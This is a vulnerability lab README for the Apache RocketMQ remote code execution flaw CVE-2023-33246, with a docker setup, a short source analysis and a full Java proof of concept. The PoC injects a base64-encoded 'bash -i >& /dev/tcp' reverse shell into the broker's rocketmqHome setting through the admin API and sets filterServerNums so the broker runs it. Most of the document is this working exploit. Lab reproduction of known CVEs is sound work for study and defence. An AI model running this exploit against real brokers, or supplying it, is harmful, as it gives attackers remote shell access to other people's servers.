# Apache RocketMQ RCE (CVE-2023-33246)

## Start

Use `docker compose` or `docker-compose` start

```shell
docker-compose up -d
```

## PoC

Use `IDEA` , `Eclipse` or `IDE` to create a new `Maven` project, import dependency:

```xml
<dependencies>
    <!-- https://mvnrepository.com/artifact/org.apache.rocketmq/rocketmq-tools -->
    <dependency>
        <groupId>org.apache.rocketmq</groupId>
        <artifactId>rocketmq-tools</artifactId>
        <version>5.1.0</version>
    </dependency>
</dependencies>
```

PoC：

```java
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;

import java.util.Base64;
import java.util.Properties;

public class Main {
    private static String getCmd(String ip, String port) {
        String cmd = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
        String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());
        return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";
    }

    public static void main(String[] args) throws Exception {
        String targetHost = "192.168.227.128";
        String targetPort = "10911";

        String shellHost = "192.168.227.128";
        String shellPort = "12345";

        String targetAddr = String.format("%s:%s",targetHost,targetPort);
        Properties props = new Properties();
        props.setProperty("rocketmqHome", getCmd(shellHost,shellPort));
        props.setProperty("filterServerNums", "1");
        DefaultMQAdminExt admin = new DefaultMQAdminExt();
        admin.setNamesrvAddr("0.0.0.0:12345");
        admin.start();
        admin.updateBrokerConfig(targetAddr, props);
        Properties brokerConfig = admin.getBrokerConfig(targetAddr);
        System.out.println(brokerConfig.getProperty("rocketmqHome"));
        System.out.println(brokerConfig.getProperty("filterServerNums"));
        admin.shutdown();
    }
}
```

After the console successfully outputs the new configuration, please wait for about 30 seconds and receive a reverse connection request:

![](screenshot.png)

## Simple Analysis

Why modify the `filterServerNums` property: If the configured `filterServerNums` is 0, the calculated `more` will also be 0, so it is not possible to enter the `callShell` method to execute commands.

```java
public void createFilterServer() {
    int more =
        this.brokerController.getBrokerConfig().getFilterServerNums() -
        this.filterServerTable.size();
    String cmd = this.buildStartCommand();
    for (int i = 0; i < more; i++) {
        FilterServerUtil.callShell(cmd, log);
    }
}

public static void callShell(final String shellString, final Logger log) {
    Process process = null;
    try {
        String[] cmdArray = splitShellString(shellString);
        process = Runtime.getRuntime().exec(cmdArray);
        process.waitFor();
        log.info("CallShell: <{}> OK", shellString);
    } catch (Throwable e) {
        log.error("CallShell: readLine IOException, {}", shellString, e);
    } finally {
        if (null != process)
            process.destroy();
    }
}
```

Why modify the `rocketmqHome` attribute: When building a command, the `splitShellString` method is ultimately called to split the parameters according to spaces. Therefore, it cannot be a `NamesrvAddr` parameter, but can only be the starting `rocketmqHome` parameter. However, due to parameter segmentation rules, stricter commands and clever techniques are required to execute.

```java
private String buildStartCommand() {
    String config = "";
    if (BrokerStartup.CONFIG_FILE_HELPER.getFile() != null) {
        config = String.format("-c %s",
        BrokerStartup.CONFIG_FILE_HELPER.getFile());
    }
    if (this.brokerController.getBrokerConfig().getNamesrvAddr() != null) {
        config += String.format(" -n %s",
        this.brokerController.getBrokerConfig().getNamesrvAddr());
    }
    if (NetworkUtil.isWindowsPlatform()) {
        return String.format("start /b %s\\bin\\mqfiltersrv.exe %s",
        this.brokerController.getBrokerConfig().getRocketmqHome(),
        config);
    } else {
        return String.format("sh %s/bin/startfsrv.sh %s",
        this.brokerController.getBrokerConfig().getRocketmqHome(),
        config);
    }
}
```